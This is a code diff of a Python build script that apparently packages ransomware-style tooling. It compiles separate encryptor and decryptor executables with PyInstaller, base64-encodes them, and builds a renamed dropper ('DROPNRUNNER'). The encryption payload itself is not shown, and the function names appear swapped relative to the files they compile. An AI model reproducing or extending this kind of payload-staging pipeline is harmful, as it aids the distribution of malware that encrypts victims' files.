@@ -7,11 +7,29 @@ def error(s):
 
 
 outpath = "C:\\Users\\noahs\\Desktop\\Repos\\LBOZO\\out"
-additionaldata = "C:/Users/noahs/Desktop/Repos/LBOZO/LBOZO/src/.env;."
 
 
-def build(program):
-    command = "python3 -m PyInstaller -F --clean LBOZO/src/main.py -n {} --distpath {} --onefile".format(
+def build_encryptor(program):
+    command = "python3 -m PyInstaller -F --clean LBOZO/src/decrypt.py -n {} --distpath {} --onefile".format(
+        program, outpath
+    )
+    os.system(command)
+
+    try:
+        with open("out/{}.exe".format(program), "rb") as f:
+            ret = f.read()
+            output64 = base64.b64encode(ret)
+    except:
+        error("{} binary doesnt exist, compilation failed.".format(program))
+
+    with open("out/base64{}".format(program), "wb") as f:
+        f.write(output64)
+
+    return output64
+
+
+def build_decryptor(program):
+    command = "python3 -m PyInstaller -F --clean LBOZO/src/encrypt.py -n {} --distpath {} --onefile".format(
         program, outpath
     )
     os.system(command)
@@ -48,6 +66,7 @@ def build_dropper(dropper_name):
     return output64
 
 
-build("LBOZO")
+build_encryptor("LBOZO")
+build_decryptor("LBOZODecryptor")
 
-build_dropper("DROPPER")
+build_dropper("DROPNRUNNER")
